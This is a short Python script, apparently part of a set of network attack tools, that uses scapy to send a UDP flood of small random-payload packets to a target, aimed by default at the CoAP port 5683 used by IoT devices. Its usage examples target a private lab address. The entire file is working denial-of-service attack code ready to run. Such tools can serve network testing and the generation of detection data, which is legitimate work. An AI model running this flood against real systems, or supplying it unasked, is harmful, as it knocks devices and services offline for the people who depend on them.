"""UDP flood: a stream of small junk UDP packets (default port 5683 = CoAP).

python udp_flood.py 172.29.1.135
python udp_flood.py 172.29.1.135 --seconds 5 --rate 500
"""
import os
import random

from scapy.layers.inet import IP, UDP
from scapy.packet import Raw

from attack_base import Attack, read_arguments


class UdpFlood(Attack):
    name = "UDP flood"

    def make_packet(self):
        return IP(dst=self.target) / UDP(sport=random.randint(1024, 65535), dport=self.port) / Raw(os.urandom(8))


if __name__ == "__main__":
    a = read_arguments("UDP flood", default_port=5683)
    UdpFlood(a.target, a.port, a.seconds, a.rate).run()
